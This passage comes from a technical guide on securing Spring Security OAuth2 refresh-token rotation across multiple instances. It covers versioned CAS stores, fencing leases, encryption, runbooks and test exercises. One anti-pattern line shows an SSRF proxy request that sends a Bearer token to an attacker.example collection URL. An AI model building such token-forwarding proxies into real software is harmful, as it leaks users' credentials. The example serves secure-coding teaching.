### 17.1. Why Is `synchronized` Not Enough?

~~~java
public synchronized OAuth2AuthorizedClient refresh(...) {
    // ...
}
~~~

`synchronized` coordinates threads only within **one JVM instance**. When Pod A and Pod B are separate processes, each pod has its own monitor. It cannot enforce single-flight refreshes across a cluster.

### 17.2. Why Is a Primary Key Not Enough?

A primary key prevents two database rows for the same `(registrationId, principalName)`. It **does not stop two HTTP calls** from sending the same `R1` to the Token Endpoint.

### 17.3. Why Is CAS Alone Still Not Enough?

Compare-and-swap blocks stale database writes and deletes. Yet if two pods already called the OP with `R1`, the OP may treat the second call as a token replay and revoke the entire family even if CAS rejects B's write.

**The solution requires two layers:**

1. **Coordinated single-flight** before calling the Token Endpoint, minimizing Refresh Token reuse.
2. **Versioned CAS / conditional cleanup** on save/delete, protecting against lease expiry, races, and stale callbacks.

## 18. Designing a Versioned Store

For advanced testing, build **a separate custom store**; never alter `JdbcOAuth2AuthorizedClientService`'s table expecting the default class to understand `version`, encrypted payload, and lease columns automatically.

Example application table:

~~~sql
CREATE TABLE oauth2_connection_secure (
    registration_id VARCHAR(100) NOT NULL,
    principal_key VARCHAR(200) NOT NULL,
    access_token_ciphertext BYTEA NOT NULL,
    refresh_token_ciphertext BYTEA,
    access_expires_at TIMESTAMPTZ NOT NULL,
    refresh_issued_at TIMESTAMPTZ,
    encrypted_data_key BYTEA NOT NULL,
    kms_key_version VARCHAR(100) NOT NULL,
    connection_status VARCHAR(30) NOT NULL,
    version BIGINT NOT NULL DEFAULT 1,
    updated_at TIMESTAMPTZ NOT NULL DEFAULT CURRENT_TIMESTAMP,
    PRIMARY KEY (registration_id, principal_key)
);
~~~

This is a **custom-designed schema**, not a drop-in for `JdbcOAuth2AuthorizedClientService`. Your custom implementation must encode and decode the entire `OAuth2AuthorizedClient` with proper versioning—preserving token type, scopes, `issuedAt`, and client registration—and avoid unsafe Java serialization.

### 18.1. Why Is `version` Needed?

Snapshot:

~~~text
Key: (company, alice)
DB version=7
Access=A1
Refresh=R1
~~~

Request A refreshes `R1` successfully and executes CAS version 7 → 8. Request B holding snapshot version 7 must not be allowed to overwrite or delete version 8.

### 18.2. Compare-and-Swap SQL Update

~~~sql
UPDATE oauth2_connection_secure
SET access_token_ciphertext = :encrypted_access_a2,
    refresh_token_ciphertext = :encrypted_refresh_r2,
    access_expires_at = :access_expires_at,
    refresh_issued_at = :refresh_issued_at,
    encrypted_data_key = :encrypted_data_key,
    kms_key_version = :kms_key_version,
    connection_status = 'ACTIVE',
    version = version + 1,
    updated_at = CURRENT_TIMESTAMP
WHERE registration_id = :registration_id
  AND principal_key = :principal_key
  AND version = :expected_version;
~~~

Interpretation:

~~~text
Updated rows = 1 -> Success; snapshot owned current version.
Updated rows = 0 -> Another writer changed record;
                    RELOAD and reconcile, do not overwrite.
~~~

If token response `R2` was issued but CAS failed, do not hastily retry with `R1`. Inspect the authoritative store's latest version and the provider contract; the remote call may have already rotated the token family.

### 18.3. Conditional Cleanup on `invalid_grant`

~~~sql
UPDATE oauth2_connection_secure
SET connection_status = 'REAUTH_REQUIRED',
    version = version + 1,
    updated_at = CURRENT_TIMESTAMP
WHERE registration_id = :registration_id
  AND principal_key = :principal_key
  AND version = :failed_request_snapshot_version;
~~~

If 0 rows are updated, another request has already modified the record. Do not blindly delete the newer token. **However**, if the OP revokes the entire family upon replay, the newer token could also be compromised/invalidated; raise alerts, validate state, or trigger re-auth rather than assuming the newer version is guaranteed valid.

### 18.4. Why Include `connection_status`?

A production workflow can distinguish:

~~~text
ACTIVE
REFRESH_IN_PROGRESS
TEMPORARILY_UNAVAILABLE
REAUTH_REQUIRED
REVOKE_PENDING
REVOKED
QUARANTINED
~~~

These are application-defined domain statuses, **not built-in Spring Security states**. Never substitute status flags for token timestamp and consent checks when authorizing access.

## 19. Distributed Single-Flight: Only One Refresh Request per Connection

Goal:

~~~text
Key = (registrationId, canonical principal key)

N concurrent requests need refresh:
  -> 1 request actually calls Token Endpoint
  -> N-1 requests wait or reload the new Access Token
~~~

### 19.1. Reference Algorithm

~~~text
authorizeOrRefresh(key):
  snapshot = store.load(key)
  if snapshot.accessTokenUsable():
      return snapshot

  lease = coordinator.tryAcquire(key, shortTimeout)
  if lease not acquired:
      waitWithBoundedBackoff()
      latest = store.load(key)
      if latest.accessTokenUsable():
          return latest
      retryAcquisitionOrReturnControlledError()

  try:
      current = store.load(key)  // RELOAD after obtaining lease
      if current.accessTokenUsable():
          return current

      if current.refreshTokenMissing():
          return REAUTH_REQUIRED

      response = tokenEndpoint.refresh(current.refreshToken)

      next = mergeTokens(current, response)
      committed = store.compareAndSwap(
          key, current.version, lease.fence, next)

      if committed:
          return next

      return reconcileWithLatestStoreAndProviderState()
  finally:
      lease.releaseIfStillOwner()
~~~

This is **pseudocode** for designing a coordinator. Spring Security does not automatically provide this distributed single-flight algorithm simply by adding `JdbcOAuth2AuthorizedClientService`.

### 19.2. Leases Must Include Fencing

A distributed lock/lease can expire past its TTL while the OP call is still in flight:

~~~text
Pod A obtains lease fence=100
Pod A blocked in network
Lease expires
Pod B obtains lease fence=101
Pod A finally returns
~~~

If the database only checks "holding lock" via a local boolean, Pod A can overwrite the new token with a stale one. A **fencing token** is a monotonically increasing number verified by the store on write alongside the optimistic version.

### 19.3. Do Not Hold a DB Transaction Open Across Arbitrary HTTP Calls

Holding a row lock inside a database transaction throughout a Token Endpoint HTTP call can:

- Tie up DB connections for long periods.
- Increase lock contention and deadlocks.
- Cause OP downtime to exhaust the DB connection pool.
- Obscure timeouts and unknown remote outcomes.

A short-lived distributed lease plus versioned saves is often better suited. If you choose pessimistic locking, bound timeouts, size pools carefully, define failure semantics, and load-test thoroughly.

### 19.4. Waiting Clients Must Never Use an Expired Access Token

Requests that did not win the lease must reload the fresh token after the leader completes. On timeout, return an error or degraded response rather than using an expired token or triggering a stampede of refreshes.

### 19.5. Lock Keys Must Be Exact

~~~text
(provider/registration, principal/connection identity)
~~~

Never use a single global lock for all users: it turns the Token Endpoint into a bottleneck. Conversely, never use a raw email as a lock key in multi-issuer/multi-tenant systems because two distinct connections could collide.

## 20. Integrating a Custom Rotation Coordinator with Spring Security

One production approach:

~~~text
Application
  -> RotationSafeAuthorizedClientService
      implements OAuth2AuthorizedClientService
      uses encrypted versioned DB store
      exposes per-connection coordinator operations

  -> Custom OAuth2AuthorizedClientManager / authorization provider adapter
      ensures coordinated refresh before remote call
      persists via conditional CAS
      handles invalid_grant with versioned cleanup

  -> OAuth2AuthorizedClientRepository
      delegates correct auth/principal lifecycle
~~~

**You cannot fully solve concurrent refreshes** solely by overriding `saveAuthorizedClient()` on the default service if duplicate Token Endpoint calls already happened in the manager layer. Single-flight must sit **in front of the remote refresh call**.

### 20.1. When Is the Built-In Service Enough?

If you only need durability for `OAuth2AuthorizedClient`, Spring Security's JDBC service works well when properly wired. If your threat model/provider enforces single-use Refresh Token rotation in a multi-instance deployment, implement custom authorization orchestration or a proven concurrency library. Never treat a shared `Mono.cache()` across all users as safe single-flight.

### 20.2. Success Handler and Failure Handler

With framework managers, verify:

- Does the success handler persist the new token under the **right registration and principal**?
- Is the new Refresh Token persisted atomically with the new Access Token?
- Does the failure handler remove tokens only for `invalid_grant` on the matching snapshot, rather than deleting unconditionally?
- Do Resource Server HTTP 401 errors use a separate failure handler from OAuth2 Token Endpoint failures?
- On OP 503, does it avoid wiping valid tokens?
- Are reactive errors composed properly rather than calling detached `subscribe()`?

Replacing default failure handlers without understanding default save/remove behavior can leave stale records; test thoroughly.

## 21. Do Not Treat All Refresh Errors the Same

| Error | Possible Cause | Sensible Action |
| --- | --- | --- |
| `invalid_grant` | Refresh Token revoked/expired/reused, client mismatch | Check snapshot/version; trigger reauth/incident per policy |
| `invalid_client` | Wrong secret/key/method/client ID | Fix client auth; never retry infinitely |
| `invalid_scope` | Scope not granted | Fix consent/request; never escalate permissions |
| HTTP 429 | OP rate limit | Bounded retry, `Retry-After`, jitter |
| HTTP 502/503/504 | OP/network unavailable | Degrade, circuit breaker, keep valid state |
| TCP timeout | Remote outcome **uncertain** | Reconcile/retry per protocol safety |
| Malformed token response | OP/client contract mismatch | Reject; never store unverified tokens |
| Resource Server 401 `invalid_token` | Wrong Access Token/API audience/expiry | Classify API error, clean up matching scope |
| Resource Server 403 `insufficient_scope` | Missing API permission | Consent/authorization; never use an admin token |

### 21.1. `invalid_grant` at Refresh Differs from Code Exchange

`invalid_grant` during Authorization Code exchange can stem from a reused code, redirect/PKCE mismatch, or expired code. `invalid_grant` during Refresh Token exchange stems from refresh token rotation, revocation, or expiry.

When logging errors, record both **grant type and stage** rather than just the error code name.

### 21.2. Do Not Automatically Assume Token Theft from One Error

A rotation race can look like a replay. At the same time, never dismiss the possibility that an attacker used the Refresh Token. When a provider signals token-family reuse or anomalies, follow your incident/quarantine/reauth playbook.

### 21.3. 503 Is Not Revocation

A Token Endpoint 503 does not mean the grant was revoked. Never call `removeAuthorizedClient()` for all users during a provider outage; preserve valid connections, apply bounded retries, and monitor the incident.

## 22. HTTP Timeouts and Unknown Outcomes

This is the hardest failure branch:

~~~mermaid
sequenceDiagram
    participant RP as RP Client
    participant OP as Authorization Server
    RP->>OP: Refresh R1
    Note over RP: Local timeout before response
    OP-->>RP: A2 + R2 (may be lost)
    RP->>RP: Store still contains R1
    RP->>OP: Retry R1
    OP-->>RP: invalid_grant / token-family reuse
~~~

### 22.1. Why Are Ordinary Retries Dangerous?

A client-side timeout only tells you **the client did not receive a response**, not that the OP failed to process the request. If the OP already rotated `R1` → `R2`, retrying `R1` triggers replay detection.

### 22.2. Recovery

Depending on the provider contract:

1. Inspect logs, event IDs, and connection state safely without printing raw tokens.
2. Reload the record: did another request already persist `R2`?
3. If no new token exists and the outcome is unknown, avoid endlessly retrying `R1`.
4. Prompt the user to re-authenticate, or use provider-supported recovery/introspection if available.
5. For critical jobs, mark the connection `REAUTH_REQUIRED` or `QUARANTINED` per policy and notify the right user.

There is no universal algorithm to "recover `R2`" if the response was lost and the OP offers no recovery mechanism.

## 23. Safe Cleanup, Revocation, and Consent

### 23.1. Local Removal

~~~java
authorizedClientService.removeAuthorizedClient(
    "company", "alice-test-sub");
~~~

This deletes the token only from the RP store. The OP may still consider the Refresh Token valid, and the Access Token may still work against APIs until it expires.

### 23.2. Remote Revocation (RFC 7009)

When a user disconnects or the system handles a compromised grant, call the OP revocation endpoint if supported:

~~~http
POST /revoke HTTP/1.1
Host: id.example.test
Content-Type: application/x-www-form-urlencoded
Authorization: Basic REDACTED_CLIENT_AUTH

token=REDACTED_REFRESH_TOKEN&
token_type_hint=refresh_token
~~~

Per RFC 7009, HTTP 200 may be returned for a newly revoked token **or one already invalid**. HTTP 503 **does not confirm** revocation; implement a safe retry queue and never mark remote revocation complete without confirmation.

### 23.3. When to Delete Locally?

Depending on your threat model, mark the local connection `REVOKE_PENDING`/unusable **before** remote revocation completes, while retaining only encrypted data needed to retry revocation over a restricted channel. Never leave raw tokens in unencrypted logs or queues.

### 23.4. User Logout Differs from Revocation

RP local logout invalidates the web session but does not automatically revoke all issued tokens. When "log out all devices" is required, design OP session logout, token revocation/introspection/denylists, and Resource Server enforcement separately.

## 24. Securing the Token Store: Application-Layer Encryption

A database holding Refresh Tokens is a **credential vault**. Disk encryption and DB TLS do not protect against SQL dumps or DB operators reading raw token columns.

### 24.1. Envelope Encryption

~~~text
Application obtains KMS-managed data key
  |
  +-- Encrypt Access Token with AEAD (e.g. AES-GCM)
  +-- Encrypt Refresh Token with AEAD
  +-- Store ciphertext + nonce + encrypted data key + key version
  |
  +-- Never store plaintext token or raw key in logs
~~~

Data encryption keys are managed per KMS policy; use a **unique random nonce** with AES-GCM, and bind authenticated associated data (AAD) to `(registrationId, principalKey, tokenType, version)` to prevent swapping rows or columns. Plan for KMS key rotation, backup/restore, re-encryption, and decrypting active records.

### 24.2. Beware Key Rotation and CAS Versions

If AAD binds the record `version`, updating the version must re-encrypt the ciphertext with the **new version's AAD** inside the same transaction. Never increment the SQL version while leaving old ciphertext/AAD intact.

### 24.3. Never Return Tokens in Diagnostic APIs

If a diagnostics endpoint is truly needed, expose only safe metadata:

~~~json
{
  "registrationAlias": "company",
  "connectionStatus": "ACTIVE",
  "accessExpiryBucket": "less_than_5_minutes",
  "refreshTokenPresent": true,
  "storeVersion": 8
}
~~~

This is an illustrative format; even principal aliases and connection statuses require authorization, auditing, and privacy controls. Never return token values, stable token hashes that link identities, raw `sub`, `sid`, or `jti` to ordinary clients.

### 24.4. Backups and Restores

- Backups must be encrypted with least-privilege access.
- KMS key versions must remain available to decrypt backups throughout retention.
- Restoring into staging **must never** send production Refresh Tokens to a live OP.
- For DR drills, use synthetic token records or scrubbed fixtures.
- Enforce deletion/retention per privacy and revocation policies rather than keeping expired tokens forever.

## 25. Provider and Tenant Isolation

An authorized client key uses `registrationId` and `principalName`, yet identity architecture must also prevent collisions such as:

~~~text
OP A: iss=A, sub=123, email=user@example.test
OP B: iss=B, sub=123, email=user@example.test
~~~

These may be two completely different people. If an application uses email as the principal key across all providers, a custom service could load the wrong account's token.

### 25.1. Do Not Blindly Swap Issuers Under the Same Registration

During a migration:

~~~text
registration "company" before: issuer A
registration "company" after:  issuer B
~~~

Old `(company, principal)` rows may remain in the store while invalid for issuer/client B. Safer practice is running dual registrations `company-old` and `company-new` with explicit identity migration. Never copy Refresh Token bytes between clients or issuers.

### 25.2. Tenant Permissions Never Come from the Access Token Alone

A user authenticated at the OP might belong only to tenant Alpha. Even with a valid Access Token, the API must still enforce issuer/audience/scope, application roles, tenant membership, and object-level ownership.

### 25.3. Negative Tests

| Case | Expected |
| --- | --- |
| Load Alice's token with Bob's principal | Not found |
| Same principal alias, different registration | Separate records |
| OP A Refresh Token sent to OP B Token Endpoint | Never sent |
| One provider returns `invalid_grant` | Does not delete other providers |
| One user logs out | Does not delete other users' tokens |
| Tenant switched | Never reuses tokens outside intended audience/consent |
| New issuer, same raw `sub` | Never auto-links accounts |

## 26. Controlled Testing of Provider Refresh Rotation

### 26.1. Fake OP State Machine

A fake OP can model:

~~~text
initial:
  currentRefresh = R1
  requestCount = 0

refresh(received):
  requestCount++

  if received != currentRefresh:
      return OAuth2 error invalid_grant

  if rotate:
      currentRefresh = nextGeneratedRefresh()
      return Access next + Refresh currentRefresh

  else:
      return Access next (no new Refresh Token)
~~~

In integration tests, implement this with WireMock/`MockWebServer` or a dedicated test Authorization Server. **Assert on call counts and fake OP state**, never printing live production tokens.

### 26.2. Core Assertions

1. Access `A1` still valid → Token Endpoint not called.
2. Access `A1` expired + valid `R1` → one successful refresh request.
3. Response includes `R2` → database stores `A2`/`R2`.
4. Response omits `R2` → database keeps `R1` when permitted by OP.
5. Already-rotated `R1` reused → `invalid_grant`, no infinite retries.
6. Error 503 → store is not wiped out by transient errors.
7. Response missing required fields → malformed tokens are not persisted.
8. Different principal/registration → token stores remain isolated.

### 26.3. Refresh Rotation Tests Need Controlled Time/Clocks

Never put `Thread.sleep(60000)` in unit tests. Inject a `Clock` into custom rotation providers/coordinators or build an already-expired Access Token fixture. Spring Security's refresh provider applies clock skew; align tests with those exact semantics.

## 27. Concurrency Testing with Barriers and Two Service Instances

You cannot prove race safety with sequential calls. Force two requests to read `R1` and run concurrently:

~~~java
// Pseudocode test orchestration, not a complete test.
CountDownLatch ready = new CountDownLatch(2);
CountDownLatch go = new CountDownLatch(1);

Callable<Result> task = () -> {
    ready.countDown();
    go.await();
    return coordinator.authorizeOrRefresh("company", "alice");
};

Future<Result> a = executor.submit(task);
Future<Result> b = executor.submit(task);

ready.await();
go.countDown();

Result ra = a.get();
Result rb = b.get();
~~~

**Never use the same `synchronized` Java object** to "simulate" two pods. Two service/coordinator instances must share the database/lease backend without sharing a JVM-local lock if testing distributed behavior.

### 27.1. With Proper Single-Flight

Expected:

~~~text
Token Endpoint receives R1 exactly once.
Both callers use latest Access A2.
Store holds Refresh R2.
Store version increased exactly once for refresh.
No invalid_grant caused by local concurrency.
~~~

### 27.2. Intentionally Without Single-Flight

The fake OP may receive `R1` twice; one request gets `invalid_grant` or triggers provider reuse detection. Tests should reproduce this baseline failure to demonstrate why a coordinator is needed—**never** treat this race as acceptable in production.

### 27.3. Testing Stale Failure Handlers

Test sequence:

~~~text
T1: Request B reads R1, version 7
T2: Request A refreshes R1 -> R2, commits version 8
T3: Request B receives invalid_grant
T4: B attempts cleanup based on version 7

Expected:
  cleanup affects 0 rows
  version 8 remains
  incident/reauth policy may still inspect token-family state
~~~

**Note:** `R2` remaining in the DB does not guarantee the OP still accepts `R2` if the OP revoked the family on replay detection. Test family-invalidation handling as well rather than only asserting the DB row exists.

## 28. Testing Database Failure After OP Rotation

A difficult failure mode:

~~~text
1. OP accepts R1 and issues R2.
2. Database update of R2 fails.
3. Database still stores R1.
4. Reusing R1 may trigger invalid_grant.
~~~

### 28.1. Principles

- Never assume a DB transaction rollback can undo **remote Token Endpoint rotation**.
- Catch the error, record a safe incident state, and avoid infinite `R1` retries.
- If retrying the DB commit with the **same successful `R2` response** in a controlled flow, enforce idempotency and version ownership; never issue another OP refresh.
- If `R2` is lost from memory without being persisted, re-authorization may be required.
- Use durable, encrypted staging/recovery only when permitted by your threat model; never write `R2` to logs or unencrypted message queues.

### 28.2. Test Outcomes

Inject a DB failure immediately after token success and observe:

~~~text
Token Endpoint requestCount = 1
No blind second refresh with R1
Connection marked degraded/reauth as appropriate
No plaintext R2 printed
Application exposes controlled retry/recovery UX
~~~

### 28.3. Transaction Boundaries

A database transaction cannot provide atomicity across a remote OP HTTP call in the traditional sense. This is a **distributed state transition**; handle unknown outcomes and recovery explicitly rather than slapping `@Transactional` on the method and assuming atomicity.

## 29. Testing Resource Server Response Classes

After a successful refresh, the RP calls the API:

~~~http
GET /reports HTTP/1.1
Host: reports.example.test
Authorization: Bearer REDACTED_ACCESS_TOKEN
~~~

The API may return:

~~~http
HTTP/1.1 401 Unauthorized
WWW-Authenticate: Bearer error="invalid_token"
~~~

or:

~~~http
HTTP/1.1 403 Forbidden
WWW-Authenticate: Bearer error="insufficient_scope", scope="reports.read"
~~~

### 29.1. Do Not Confuse 401 with `invalid_grant`

- `invalid_grant` comes from the **Authorization Server Token Endpoint**, typically tied to codes, Refresh Tokens, or grants.
- `invalid_token` is a Bearer error at the **Resource Server**, tied to the Access Token.
- `insufficient_scope` is an authorization failure; it does not mean the Refresh Token was revoked.
- API 503 typically indicates an API outage, not a reason to refresh endlessly.

### 29.2. Failure Handlers on API Calls

With Spring Security Servlet/Reactive `WebClient`, an `OAuth2AuthorizationFailureHandler` can handle Bearer errors and evict stale authorized clients per policy. Test cleanup scoped to `(registrationId, principalName)` and version, especially when a concurrent request just refreshed the token.

### 29.3. Audience and Scope

An Access Token valid at the OP might still not be intended for the Reports API. The Resource Server must validate trusted issuer, audience, expiry, scopes/authorities, and tenant permissions. Never use an ID Token as an API Bearer Token.

## 30. `WebClient` and `RestClient` Must Never Leak Credentials

When calling downstream services, send OAuth2 tokens only to **configured trusted destinations**. For instance, a `WebClient`/`RestClient` filter can attach an authorized client by `clientRegistrationId`; enforce a base URL allowlist and proper resource audience.

### 30.1. SSRF Risks

Anti-pattern:

~~~text
GET /proxy?url=https://attacker.example/collect
  -> Backend uses default OAuth2 authorized client
  -> Bearer Access Token leaks to attacker host
~~~

Never accept a user-supplied URL and attach tokens to it. On HTTP redirects, verify whether the HTTP client strips `Authorization` headers across hosts and block unauthorized outbound targets.

### 30.2. Never Log Full Request/Response Wiretaps

HTTP wiretaps and debug header logging can record `Authorization`, Token Endpoint form bodies, and Access/Refresh Token responses. In tests, use redacted event metadata and fake tokens; never retain traces containing secrets.

## 31. Reactive/WebFlux Counterparts

In WebFlux, interfaces carry the `Reactive` prefix:

| Servlet | Reactive |
| --- | --- |
| `OAuth2AuthorizedClientService` | `ReactiveOAuth2AuthorizedClientService` |
| `OAuth2AuthorizedClientRepository` | `ServerOAuth2AuthorizedClientRepository` |
| `DefaultOAuth2AuthorizedClientManager` | `DefaultReactiveOAuth2AuthorizedClientManager` |
| `AuthorizedClientServiceOAuth2AuthorizedClientManager` | `AuthorizedClientServiceReactiveOAuth2AuthorizedClientManager` |
| `SecurityFilterChain` | `SecurityWebFilterChain` |
| `HttpSession` | `WebSession` |

### 31.1. Persisting Authorized Clients in Reactive Apps

Reactive stores/services return `Mono` for save/load/remove. `InMemoryReactiveOAuth2AuthorizedClientService` works for demos but does not survive restarts. For multi-node deployments, build and test a durable reactive repository or custom R2DBC store.

### 31.2. Never Call `subscribe()` Manually Inside Security Handlers

~~~java
// WRONG: cleanup runs outside the request/security lifecycle.
reactiveService.removeAuthorizedClient(id, principal)
    .subscribe();
return Mono.empty();

// BETTER: compose the publisher and let the framework subscribe.
return reactiveService.removeAuthorizedClient(id, principal);
~~~

This is an illustrative fragment. Manual `subscribe()` detaches from Reactor Context, error/cancellation propagation, and transactions, potentially returning HTTP success before the database update finishes.

### 31.3. Never Block the Event Loop

If a custom store uses blocking JDBC inside WebFlux:

~~~java
// Temporarily isolate blocking operations.
Mono<OAuth2AuthorizedClient> load(String id, String principal) {
    return Mono.fromCallable(() ->
            blockingService.loadAuthorizedClient(id, principal))
        .subscribeOn(Schedulers.boundedElastic());
}
~~~

This does not make JDBC non-blocking; `boundedElastic` still has thread/queue bounds. Prefer reactive drivers/architectures and test with BlockHound and latency checks. Concurrency and versioned CAS must still be solved just as in Servlet apps.

### 31.4. Reactive `SecurityContext`

`ReactiveSecurityContextHolder` relies on Reactor Context, not Servlet `ThreadLocal`. Background jobs without a `ServerWebExchange` need policy-compliant principals and authorization; never reuse a browser user's token in a detached subscription.

## 32. Observability: Seeing Rotation Errors Without Seeing Tokens

Sample structured event:

~~~json
{
  "event": "oauth2_refresh_failed",
  "providerAlias": "company",
  "registrationId": "company",
  "stage": "refresh_token",
  "errorCategory": "invalid_grant",
  "snapshotVersion": 7,
  "latestVersion": 8,
  "concurrencyDetected": true,
  "correlationId": "oauth2-attempt-92",
  "secretFieldsRedacted": true
}
~~~

This is a **suggested format**, not automatic output from Spring Security. Avoid logging raw `sub`, email, Access/Refresh Tokens, authorization codes, `state`, `nonce`, client secrets, or SQL ciphertext if they risk correlating identities.

### 32.1. Suggested Metrics

| Metric | Safe Tags |
| --- | --- |
| `oauth2_authorized_client_save_total` | registration, result |
| `oauth2_authorized_client_load_total` | registration, hit/miss |
| `oauth2_refresh_attempt_total` | provider, grant, result |
| `oauth2_refresh_invalid_grant_total` | provider, safe reason class |
| `oauth2_refresh_rotation_total` | provider |
| `oauth2_refresh_lock_wait_duration` | provider, coarse region |
| `oauth2_refresh_cas_conflict_total` | provider |
| `oauth2_refresh_unknown_outcome_total` | provider |
| `oauth2_token_store_error_total` | store, class |
| `oauth2_authorized_client_reauth_required_total` | provider |
| `oauth2_token_revocation_pending_total` | provider |

Never put raw user IDs, principals, token hashes, JWT `jti`, or session IDs into metric labels due to PII and high cardinality.

### 32.2. Alerts

Alert when:

- `invalid_grant` spikes right after a deployment or secret rotation.
- Refresh Token reuse/rotation failures rise for a provider.
- CAS conflicts climb or lock wait times grow excessive.
- Token Endpoint returns 429/503 or circuit breakers open.
- The token database store becomes unavailable.
- Large numbers of users transition to `REAUTH_REQUIRED`.
- The logging pipeline detects a token or credential leak.

Never jump to assuming every `invalid_grant` is a compromise; classify incidents based on evidence.

## 33. Runbook A — Restart Loses Authorized Clients

**Symptom:** After a restart, login may or may not remain, yet the service reports missing tokens.

**Check:**

1. Is the service using the JDBC service or in-memory?
2. Does the repository bean delegate to the right service?
3. Is the application pointing to the right DB/schema/version?
4. Did the `(registrationId, principalName)` key change?
5. Was the token deleted by custom cleanup/logout logic?
6. Did a test only rely on local sessions and mistake that for persistent storage?

**Fix:** Fix bean wiring, schema, or key mapping, and verify save/load via a fresh service instance; never log live tokens to debug.

## 34. Runbook B — Refresh Succeeds Yet Next Call Still Uses `R1`

**Symptom:** OP returns `R2`, yet the subsequent request sends `R1` and gets `invalid_grant`.

**Check:**

- Did the response actually contain `R2`?
- Did the success handler persist `R2`?
- Did the store transaction roll back?
- Did another pod overwrite with an older record?
- Is a manager reading from an in-memory/session store instead of JDBC?
- Did the principal/registration key differ between save and load?
- Did encryption/serialization preserve the new refresh token?

**Fix:** Make updates atomic with versioned CAS; ensure all instances share the same store; never retry `R1` infinitely.

## 35. Runbook C — `invalid_grant` Spikes After Scale-Out

**Symptom:** Users are intermittently forced to log in again even though fresh Access Tokens were recently issued.

**Check:** Two pods refreshing `R1` concurrently, default failure cleanup deleting `R2`, OP replay policies, lack of distributed coordination.

**Fix:** Implement per-connection single-flight + fencing/versioned updates; investigate token-family revocation; prompt re-authorization when the provider cannot recover.

## 36. Runbook D — Provider 503 Wipes Out Tokens

**Symptom:** An OP outage causes widespread connections to lose their tokens.

**Check:** Is a custom failure handler deleting authorized clients on **every** exception? Is a Token Endpoint 503 being treated like `invalid_grant`?

**Fix:** Separate transient from permanent errors, halt blanket deletions, apply bounded retries/backoff/circuit breakers, preserve valid state, and restore connections per consent policy.

## 37. Runbook E — `invalid_client` After Secret Rotation

**Symptom:** Login and refresh fail at the Token Endpoint after deployment.

**Check:** Client ID/secret versions, client authentication method, OP overlap window, pod rollout status, secret manager access, tenant/realm.

**Fix:** If the old secret is still valid, roll back the secret reference; if revoked, deploy a forward fix with the new credential. Never use an emergency admin secret or log raw secrets.

## 38. Runbook F — Token Database or KMS Unavailable

**Symptom:** App has active user sessions but cannot load or refresh authorized clients.

**Check:** DB connection pool, TLS, privileges, schema migrations, KMS key versions/decrypt permissions, network.

**Fix:** Fail safely with service errors or degraded UX. Never pull stale cached tokens without expiry checks, fall back to plaintext files, or disable encryption. After recovery, audit rotation state and unknown outcomes.

## 39. Extended Exercises

### Exercise 1 — Persistent Store

Replace the in-memory authorized-client service with JDBC, run a login test, restart the app, and confirm the authorized client remains in the database.

**Pass:** Record loads after restart; API never exposes tokens.

### Exercise 2 — Rotation

Have the mock OP return `A2`/`R2` upon receiving `R1`. Trigger refresh and reload from the DB.

**Pass:** `A2`/`R2` are persisted; `R1` is no longer the active Refresh Token in the store.

### Exercise 3 — No New Refresh Token

Have the mock OP return `A2` with no refresh token.

**Pass:** Retains `R1` when allowed by the provider contract rather than setting `null`.

### Exercise 4 — Concurrent Refresh

Run two managers/service instances against shared PostgreSQL. Fire concurrent requests against a fake OP with single-use rotation.

**Pass:** Only one remote refresh occurs for `R1`; both callers receive the new authorized client (or one returns a controlled retry result without duplicating token calls).

### Exercise 5 — Stale Cleanup

Force Request B to hold snapshot version 7 while Request A commits version 8, then have B receive `invalid_grant`.

**Pass:** B does not delete version 8; security events log safe categories and versions.

### Exercise 6 — OP 503

Switch the fake OP from success to 503.

**Pass:** Store does not delete authorized clients during outages; retries are bounded with no token request storms.

### Exercise 7 — DB Failure After Rotation

Have the OP return `R2` and then simulate a database write failure.

**Pass:** No infinite `R1` retries; recovery state is recorded and `R2` never leaks into logs.

### Exercise 8 — Provider/User Isolation

Create Alice/Bob and `company`/`partner` connections intentionally sharing an email or raw subject.

**Pass:** Tokens are never loaded, refreshed, or deleted across identities or registrations.

### Exercise 9 — KMS Rotation

Re-encrypt records using a new data-key/key-version, and test restores alongside concurrent CAS updates.

**Pass:** Tokens decrypt cleanly under authorized keys without downgrading to plaintext.

### Exercise 10 — Logout / Disconnect

Remove the local authorized client and call the test revocation endpoint when required by policy.

**Pass:** Distinguishes local deletion from remote revocation; 503 retains `REVOKE_PENDING` rather than falsely reporting success.

## 40. Production Checklist

| Area | Question to Answer |
| --- | --- |
| Store | Using a durable shared store rather than in-memory in production? |
| Schema | Migration matches exact Spring Security version and driver? |
| Startup | Restarts and rolling deploys still load authorized clients? |
| Identity | Principal keys and issuer namespaces are accurate? |
| Token protection | TLS, access controls, backups, KMS/envelope encryption in place? |
| Retention | Expired/revoked credentials cleaned up under policy? |
| Refresh semantics | OP rotation, expiry, and replay policies verified? |
| New Refresh Token | Persisted atomically with new Access Token? |
| Missing Refresh Token | Retains existing token cleanly per contract? |
| Concurrency | Single-flight before OP and CAS/fencing after OP? |
| Failure cleanup | Stale `invalid_grant` never deletes newer versions? |
| Unknown outcome | Timeouts/DB failures never retry `R1` endlessly? |
| API | Audience, scope, and tenant authorization enforced? |
| Handlers | Token Endpoint failures separated from Resource Server 401/403? |
| Secret rotation | Client secret/key updates do not break granted tokens? |
| Provider isolation | Provider A's Refresh Token is never sent to Provider B? |
| Session | `HttpSession`/`WebSession` kept distinct from authorized-client store? |
| Logout/revocation | Local removal and remote revocation have explicit contracts? |
| Observability | Metrics/alerts scoped by provider without PII/high cardinality? |
| Testing | Testcontainers, mock OP, race barriers, and failure injection covered? |
| Rollback | Recovery/reauth path exists when `R2` is lost and old token is unusable? |

## 41. Review Questions

**1. How does `OAuth2AuthorizedClientService` differ from `OAuth2AuthorizedClientRepository`?**

The service saves, loads, and removes authorized clients by registration and principal, whereas the repository operates within HTTP/authentication context and can delegate to either a service or a session-backed implementation. An application must wire them consistently so both login and managers use the intended persistent backend.

**2. Is using the JDBC service alone enough to guarantee safe Refresh Token rotation across multiple pods?**

No. JDBC solves durability, not duplicate remote refreshes, stale writes/failure cleanup, or application-layer encryption.

**3. Why is CAS alone not enough to stop a provider from revoking a token family?**

CAS only blocks stale-version database updates or deletes; two requests can still have sent the same `R1` to the OP. Single-flight coordination is needed before the remote call.

**4. When the OP returns `R2`, should you keep storing `R1`?**

No under rotation semantics; replace the active Refresh Token with `R2` and discard `R1`. If the OP omits a new Refresh Token, retain the existing one per contract.

**5. Does `invalid_grant` always prove a token was stolen?**

No. It can result from expired/revoked grants, client mismatches, or concurrency races. Still, OP reuse detection must be treated seriously under incident policy.

**6. On a Token Endpoint 503, should you delete the authorized client?**

